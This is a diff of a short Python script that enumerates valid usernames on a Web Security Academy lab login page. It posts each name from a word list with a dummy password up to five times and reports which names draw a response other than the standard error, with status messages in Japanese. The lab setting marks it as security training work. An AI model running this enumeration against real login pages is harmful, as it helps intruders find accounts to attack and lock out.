@@ -1,27 +1,33 @@
 import requests
 
-URL = "https://0a7c00060403afd6806b213600c5007d.web-security-academy.net/login"
+URL = 'https://0a74005e04dd7a98832e5c1c004f00da.web-security-academy.net/login'
 normal_error = 'Invalid username or password.'
 
-with open("expanded_list.txt", "r") as f:
+with open('usernames.txt', 'r') as f:
     usernames = f.read().splitlines()
 
-print("[*] ユーザー名の列挙を開始します！")
+print('[*] ユーザー名の列挙を開始します！')
 
 session = requests.Session()
-found_users = set()
 
 for username in usernames:
-    data = {
-        "username": username,
-        "password": 'a'
-    }
+    is_valid_user = False
 
-    # リダイレクト有無を判定するため、POST後に自動追従しない
-    response = session.post(URL, data=data, timeout=10)
-    if normal_error not in response.text:
-        if username not in found_users:
-            print(f'検知メッセージ：{response.text[500:700].strip()}')
-            print(f'{username}ユーザーの存在が確認されました。')
+    for i in range(5):
+        data = {
+            'username': username,
+            'password': 'a'
+        }
 
-            found_users.add(username)
+        try:
+            response = session.post(URL, data=data, timeout=5)
+
+            if normal_error not in response.text:
+                is_valid_user = True
+                break
+
+        except Exception:
+            break
+
+    status_icon = '○' if is_valid_user else '✕'
+    print(f'{username:20} → {status_icon}')
